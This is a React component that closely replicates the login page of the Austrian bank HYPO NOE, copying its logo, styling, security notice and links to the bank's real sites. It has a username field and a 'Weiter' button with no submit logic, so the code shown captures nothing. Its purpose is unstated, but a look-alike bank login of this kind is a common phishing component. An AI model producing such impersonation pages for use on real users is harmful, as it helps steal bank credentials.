import { useState } from "react";
import { X, Info } from "lucide-react";
import hyponoeLogo from "@/assets/hyponoe-logo.jpg";
import hyponoeBg from "@/assets/hyponoe-bg.png";

const HypoNoe = () => {
  const [username, setUsername] = useState("");
  const [isFocused, setIsFocused] = useState(false);

  return (
    <div className="min-h-screen flex flex-col" style={{ fontFamily: "Arial, 'Helvetica Neue', Helvetica, sans-serif" }}>
      {/* Header */}
      <header style={{ backgroundColor: "#fff" }}>
        <div className="max-w-[1200px] mx-auto flex items-center px-4 py-2">
          <img src={hyponoeLogo} alt="HYPO NOE" className="h-10 md:h-14" />
        </div>
      </header>

      {/* Main */}
      <div
        className="flex-1 flex items-center justify-center px-4"
        style={{
          backgroundImage: `url(${hyponoeBg})`,
          backgroundSize: "cover",
          backgroundPosition: "center",
          backgroundRepeat: "no-repeat",
        }}
      >
        <div className="w-full max-w-[560px] overflow-hidden">
          {/* Blue header bar */}
          <div
            className="px-6 py-4 text-white font-semibold text-2xl"
            style={{ backgroundColor: "#0066cc" }}
          >
            Login 24/7 Internetbanking
          </div>

          {/* Card body */}
          <div className="bg-white px-6 py-5 space-y-4">
            {/* Info text */}
            <p className="text-sm leading-snug" style={{ color: "#333" }}>
              Beim Login wird eine sichere Verbindung aufgebaut. Bitte halten Sie Ihre Anmeldedaten geheim und achten Sie darauf, dass Sie Ihre Anmeldedaten auf keiner Ihnen unbekannten Seite eingeben. Unsere Mitarbeiter werden Sie niemals nach Ihren Anmeldedaten befragen.
            </p>

            {/* Sicherheitsempfehlungen link */}
            <p className="text-[13px]" style={{ color: "#333" }}>
              Bitte beachten Sie unsere{" "}
              <a
                href="https://www.hyponoe.at/services/sicherheitszentrum"
                target="_blank"
                rel="noopener noreferrer"
                className="no-underline hover:underline"
                style={{ color: "#0066cc" }}
              >
                Sicherheitsempfehlungen.
              </a>
            </p>

            {/* Divider */}
            <hr className="border-gray-200" />

            {/* Label row */}
            <div className="flex items-center">
              <span className="font-semibold text-xs" style={{ color: "#999" }}>
                Benutzername
              </span>
            </div>

            {/* Username input */}
            <div className="relative">
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                onFocus={() => setIsFocused(true)}
                onBlur={() => setIsFocused(false)}
                className="w-full px-3 py-2.5 border text-sm outline-none transition-colors rounded-sm"
                style={{
                  backgroundColor: isFocused ? "#d6e5f4" : "#f1f1f1",
                  borderColor: isFocused ? "#0066cc" : "#dedede",
                  boxShadow: isFocused ? "0 0 0 1px #0066cc" : "none",
                }}
              />
              {username && (
                <button
                  onClick={() => setUsername("")}
                  className="absolute right-2 top-1/2 -translate-y-1/2"
                  type="button"
                >
                  <X size={24} color={isFocused ? "#0066cc" : "#333"} />
                </button>
              )}
            </div>

            {/* Erste Anmeldung */}
            <div className="text-center">
              <a
                href="https://internetbanking.hyponoe.at/banking/erstlogin2c/erstlogin2c.xhtml"
                target="_blank"
                rel="noopener noreferrer"
                className="text-sm no-underline hover:underline"
                style={{ color: "#0066cc" }}
              >
                Sie melden sich zum ersten Mal an?
              </a>
            </div>

            {/* Divider */}
            <hr className="-mx-6 border-gray-200" />

            {/* AGB Text */}
            <p className="text-[13px] text-center" style={{ color: "#333" }}>
              Mit dem Login stimmen Sie den{" "}
              <a href="https://www.hyponoe.at/de/veroffentlichungen/hypo-noe-gruppe/agb" target="_blank" rel="noopener noreferrer" className="no-underline hover:underline" style={{ color: "#0066cc" }}>
                AGB
              </a>{" "}
              und{" "}
              <a href="https://www.hyponoe.at/de/veroffentlichungen/hypo-noe-gruppe/agb" target="_blank" rel="noopener noreferrer" className="no-underline hover:underline" style={{ color: "#0066cc" }}>
                Nutzungsbedingungen
              </a>{" "}
              sowie der{" "}
              <a href="#" onClick={(e) => e.preventDefault()} className="no-underline hover:underline" style={{ color: "#0066cc" }}>
                Datenschutzerklärung
              </a>{" "}
              der HYPO NOE Landesbank für Niederösterreich und Wien AG ausdrücklich zu.
            </p>

            {/* Divider above button */}
            <hr className="-mx-6 border-gray-200" />

            {/* Weiter button */}
            <button
              className="w-full py-2 text-white font-normal text-sm"
              style={{ backgroundColor: "#0066cc" }}
            >
              Weiter
            </button>

            {/* Divider below button */}
            <hr className="-mx-6 border-gray-200" />

            {/* Links */}
            <div className="flex flex-col items-center gap-2">
              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                style={{ color: "#0066cc" }}
              >
                Benutzername vergessen?
              </a>
              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                className="text-[15px] no-underline hover:underline leading-tight py-0 my-0 inline-flex items-center gap-1"
                style={{ color: "#0066cc" }}
              >
                <Info size={16} />
                Live Hilfe
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default HypoNoe;
